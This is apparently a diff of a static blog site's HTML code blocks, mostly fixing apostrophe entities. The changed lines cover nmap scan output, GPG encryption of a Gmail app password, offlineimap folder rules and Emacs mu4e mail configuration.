+&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_&lt;/span&gt;  &lt;span class=&quot;mi&quot;&gt;256&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;43&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ad&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a3&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;d1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;64&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;86&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;33&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mo&quot;&gt;07&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mx&quot;&gt;5d&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;94&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f9&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a4&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mo&quot;&gt;01&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ED25519&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
 &lt;span class=&quot;mi&quot;&gt;80&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tcp&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;open&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;http&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;Apache&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;httpd&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;2.4.18&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Ubuntu&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
 &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_http&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;server&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;header&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Apache&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;2.4.18&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Ubuntu&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
 &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;http&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;title&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Authenticate&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Please&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;
@@ -744,12 +744,12 @@ Retype password &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;test_gmail: &lt
 gpg &lt;span class=&quot;nt&quot;&gt;--full-generate-key&lt;/span&gt;
 &lt;span class=&quot;c&quot;&gt;# After u create your own key, find it through the following command&lt;/span&gt;
 gpg &lt;span class=&quot;nt&quot;&gt;-K&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--keyid-format&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;long
-&lt;span class=&quot;c&quot;&gt;# You&apos;ll get something like this &lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# You'll get something like this &lt;/span&gt;
 &lt;span class=&quot;c&quot;&gt;# sec   rsa2048/84263A08F86B7E99 2020-06-17 [SC] [expires: 2022-06-17]&lt;/span&gt;
 &lt;span class=&quot;c&quot;&gt;#       447FE384AAE41F357F5876FF84263A08F86B7E99&lt;/span&gt;
 &lt;span class=&quot;c&quot;&gt;# uid                 [ultimate] Ybenel &amp;lt;r2dr0dn@pm.me&amp;gt;&lt;/span&gt;
 &lt;span class=&quot;c&quot;&gt;# ssb   rsa2048/C8D9741AC03BE89C 2020-06-17 [E] [expires: 2022-06-17]&lt;/span&gt;
-&lt;span class=&quot;c&quot;&gt;# Now you have your long key and ur short key, you can use whatever u want , now let&apos;s encrypt your file&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# Now you have your long key and ur short key, you can use whatever u want , now let's encrypt your file&lt;/span&gt;
 &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;YOUR APP PASSWORD&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; gmail_app
 gpg &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-r&lt;/span&gt; 84263A08F86B7E99 gmail_app 
 &lt;span class=&quot;c&quot;&gt;# This will create a new encrypted file called gmail_app.gpg, delete the gmail_app that contains plain text passowrd preferbly using shred&lt;/span&gt;
@@ -836,7 +836,7 @@ To Install simply run .&lt;/p&gt;
 &lt;span class=&quot;nn&quot;&gt;[Repository Local]&lt;/span&gt;
 &lt;span class=&quot;py&quot;&gt;type&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;Maildir&lt;/span&gt;
 &lt;span class=&quot;py&quot;&gt;localfolders&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;~/Maildir&lt;/span&gt;
-&lt;span class=&quot;py&quot;&gt;nametrans&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;lambda f: &apos;[Gmail]/&apos; + f if f in [&apos;Drafts&apos;, &apos;Starred&apos;, &apos;Important&apos;, &apos;Spam&apos;, &apos;Trash&apos;, &apos;All Mail&apos;, &apos;Sent Mail&apos;] else f&lt;/span&gt;
+&lt;span class=&quot;py&quot;&gt;nametrans&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;lambda f: '[Gmail]/' + f if f in ['Drafts', 'Starred', 'Important', 'Spam', 'Trash', 'All Mail', 'Sent Mail'] else f&lt;/span&gt;
 
 &lt;span class=&quot;nn&quot;&gt;[Repository Remote]&lt;/span&gt;
 &lt;span class=&quot;py&quot;&gt;type&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;IMAP&lt;/span&gt;
@@ -851,8 +851,8 @@ To Install simply run .&lt;/p&gt;
 &lt;span class=&quot;py&quot;&gt;maxconnections&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;1&lt;/span&gt;
 &lt;span class=&quot;py&quot;&gt;sslcacertfile&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;/etc/ssl/certs/ca-certificates.crt&lt;/span&gt;
 &lt;span class=&quot;py&quot;&gt;ssl_version&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;tls1_2&lt;/span&gt;
-&lt;span class=&quot;py&quot;&gt;folderfilter&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;lambda foldername: foldername in [&apos;INBOX&apos;, &apos;All Mail&apos;, &apos;Sent Mail&apos;]&lt;/span&gt;
-&lt;span class=&quot;py&quot;&gt;nametrans&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;lambda f: f.replace(&apos;[Gmail]/&apos;, &apos;&apos;) if f.startswith(&apos;[Gmail]/&apos;) else f&lt;/span&gt;
+&lt;span class=&quot;py&quot;&gt;folderfilter&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;lambda foldername: foldername in ['INBOX', 'All Mail', 'Sent Mail']&lt;/span&gt;
+&lt;span class=&quot;py&quot;&gt;nametrans&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;lambda f: f.replace('[Gmail]/', '') if f.startswith('[Gmail]/') else f&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 &lt;p&gt;Replace &lt;strong&gt;CLIENT-ID,CLIENT-SECRET,REFRESH-TOKEN&lt;/strong&gt; with the tokens you’ve got.
 In Case Of Using &lt;strong&gt;GPG ENCRYPTED PASSWORD&lt;/strong&gt;&lt;/p&gt;
@@ -887,10 +887,10 @@ mu index
 &lt;h2 id=&quot;setting-up-mu4e-in-emacs&quot;&gt;Setting Up mu4e in emacs&lt;/h2&gt;
 &lt;p&gt;There isn’t much to do with  &lt;strong&gt;mu4e&lt;/strong&gt; in &lt;strong&gt;emacs&lt;/strong&gt; besides adding our configurations.
 My configurations is the following .&lt;/p&gt;
-&lt;div class=&quot;language-lisp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;add-to-list&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;&apos;load-path&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;/usr/share/emacs/site-lisp/mu4e&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;with-eval-after-load&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;&apos;mu4e&lt;/span&gt;
-  &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;setq&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;mu4e-context-policy&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;&apos;ask-if-none&lt;/span&gt;
-        &lt;span class=&quot;nv&quot;&gt;mu4e-compose-context-policy&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;&apos;pick-first&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;div class=&quot;language-lisp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;add-to-list&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;'load-path&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;/usr/share/emacs/site-lisp/mu4e&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;with-eval-after-load&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;'mu4e&lt;/span&gt;
+  &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;setq&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;mu4e-context-policy&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;'ask-if-none&lt;/span&gt;
+        &lt;span class=&quot;nv&quot;&gt;mu4e-compose-context-policy&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;'pick-first&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
   &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;setq&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;mu4e-change-filenames-when-moving&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
   &lt;span class=&quot;c1&quot;&gt;;; refresh mail using isync every 10 minutes&lt;/span&gt;
   &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;setq&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;mu4e-update-interval&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;60&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
@@ -898,12 +898,12 @@ My configurations is the following .&lt;/p&gt;
   &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;setq&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;mu4e-mu-binary&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;~/Downloads/mu-1.6.6/mu/mu&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
   &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;setq&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;mu4e-get-mail-command&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;mbsync -a&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
   &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;setq&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;mu4e-root-maildir&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;~/Mail&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-  &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;bind-key&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;C-c C-m&quot;&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;&apos;mu4e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+  &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;bind-key&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;C-c C-m&quot;&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;'mu4e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
   &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;setq&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;mu4e-html2text-command&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;w3m -dump -T text/html -o display_link_number=true&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-  &lt;span class=&quot;c1&quot;&gt;;; (setq mu4e-html2text-command &quot;html2markdown | grep -v &apos;&amp;amp;nbsp_place_holder;&apos;&quot;)&lt;/span&gt;
+  &lt;span class=&quot;c1&quot;&gt;;; (setq mu4e-html2text-command &quot;html2markdown | grep -v '&amp;amp;nbsp_place_holder;'&quot;)&lt;/span&gt;
 
   &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;set-email-account!&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Personal&quot;&lt;/span&gt;
-                      &lt;span class=&quot;o&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;mu4e-sent-folder&lt;/span&gt;          &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;/Gmail/[Gmail]/Sent Mail&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+                      &lt;span class=&quot;o&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;mu4e-sent-folder&lt;/span&gt;          &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;/Gmail/[Gmail]/Sent Mail&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
                         &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;mu4e-drafts-folder&lt;/span&gt;        &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;/Gmail/[Gmail]/Drafts&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
                         &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;mu4e-refile-folder&lt;/span&gt;        &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;/Gmail/[Gmail]/All Mail&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
                         &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;mu4e-trash-folder&lt;/span&gt;         &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;/Gmail/[Gmail]/Trash&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
@@ -917,7 +917,7 @@ My configurations is the following .&lt;/p&gt;
                       &lt;span class=&quot;no&quot;&gt;t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
 
   &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;setq&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;mu4e-maildir-shortcuts&lt;/span&gt;
-        &lt;span class=&quot;o&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/Gmail/inbox&quot;&lt;/span&gt;             &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;?i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;o&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/Gmail/inbox&quot;&lt;/span&gt;             &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;?i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
           &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/Gmail/[Gmail]/Sent Mail&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;?s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
           &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/Gmail/[Gmail]/Trash&quot;&lt;/span&gt;     &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;?t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
           &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/Gmail/[Gmail]/Drafts&quot;&lt;/span&gt;    &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;?d&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
@@ -935,17 +935,17 @@ My Configurations for it is .&lt;/p&gt;
   &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;mu4e-alert-enable-mode-line-display&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
   &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;mu4e-alert-enable-notifications&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
 
-  &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;mu4e-alert-set-default-style&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;&apos;libnotify&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+  &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;mu4e-alert-set-default-style&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;'libnotify&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
   &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;map!&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;:leader&lt;/span&gt;
         &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;ss&quot;&gt;:prefix&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;d&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;mu4e&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-         &lt;span class=&quot;ss&quot;&gt;:desc&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Disable Mu4e Modeline Alert&quot;&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;d&quot;&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;#&apos;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;mu4e-alert-disable-mode-line-display&lt;/span&gt;
-         &lt;span class=&quot;ss&quot;&gt;:desc&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Enable Mu4e Modeline Alert&quot;&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;i&quot;&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;#&apos;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;mu4e-alert-enable-mode-line-display&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+         &lt;span class=&quot;ss&quot;&gt;:desc&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Disable Mu4e Modeline Alert&quot;&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;d&quot;&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;#'&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;mu4e-alert-disable-mode-line-display&lt;/span&gt;
+         &lt;span class=&quot;ss&quot;&gt;:desc&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Enable Mu4e Modeline Alert&quot;&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;i&quot;&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;#'&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;mu4e-alert-enable-mode-line-display&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
 
-  &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;defvar&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;+mu4e-alert-bell-cmd&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;paplay&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;/usr/share/sounds/freedesktop/stereo/message.oga&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+  &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;defvar&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;+mu4e-alert-bell-cmd&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;paplay&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;/usr/share/sounds/freedesktop/stereo/message.oga&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
     &lt;span class=&quot;s&quot;&gt;&quot;Cons list with command to play a sound, and the sound file to play.
                  Disabled when set to nil.&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
 
-  &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;setq&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;mu4e-alert-email-notification-types&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;subjects&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+  &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;setq&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;mu4e-alert-email-notification-types&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;subjects&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
   &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;defun&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;+mu4e-alert-grouped-mail-notification-formatter-with-bell&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;mail-group&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;_all-mails&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
     &lt;span class=&quot;s&quot;&gt;&quot;Default function to format MAIL-GROUP for notification.
                  ALL-MAILS are the all the unread emails&quot;&lt;/span&gt;
@@ -985,7 +985,7 @@ My Configurations for it is .&lt;/p&gt;
              &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;subject&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;plist-get&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;new-mail&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;:subject&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
              &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;sender&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;caar&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;plist-get&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;new-mail&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;:from&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))))&lt;/span&gt;
